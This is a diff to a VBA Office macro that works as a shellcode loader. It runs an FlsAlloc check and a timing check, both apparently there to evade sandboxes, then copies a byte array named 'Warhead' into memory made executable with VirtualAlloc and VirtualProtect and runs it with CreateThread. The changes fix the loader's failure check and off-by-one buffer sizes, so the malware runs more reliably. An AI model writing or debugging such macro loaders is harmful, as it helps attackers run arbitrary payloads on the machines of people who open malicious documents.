@@ -17,8 +17,8 @@ Function MyMacro()
     Dim t2 As Date
     Dim time As Long
 
-    ' Exit if FlsAlloc fails
-    If IsNull(FlsAlloc(tmp)) Then Exit Function
+    ' Exit if FlsAlloc fails (returns FLS_OUT_OF_INDEXES = &HFFFFFFFF on failure)
+    If FlsAlloc(tmp) = &HFFFFFFFF Then Exit Function
     
     ' Timing check
     t1 = Now()
@@ -64,7 +64,7 @@ Function MyMacro()
     Next i
 
     ' Allocate memory with read/write permissions
-    address = VirtualAlloc(0, UBound(Warhead), &H3000, &H4)  ' MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE
+    address = VirtualAlloc(0, UBound(Warhead) + 1, &H3000, &H4)  ' MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE
     
     ' Copy shellcode into the allocated memory
     For counter = LBound(Warhead) To UBound(Warhead)
@@ -73,7 +73,7 @@ Function MyMacro()
     Next counter
     
     ' Change memory protection to executable
-    res = VirtualProtect(address, UBound(Warhead), &H20, oldProtect) ' PAGE_EXECUTE_READ
+    res = VirtualProtect(address, UBound(Warhead) + 1, &H20, oldProtect) ' PAGE_EXECUTE_READ
     
     ' Create a new thread to execute the shellcode
     res = CreateThread(0, 0, address, 0, 0, 0)
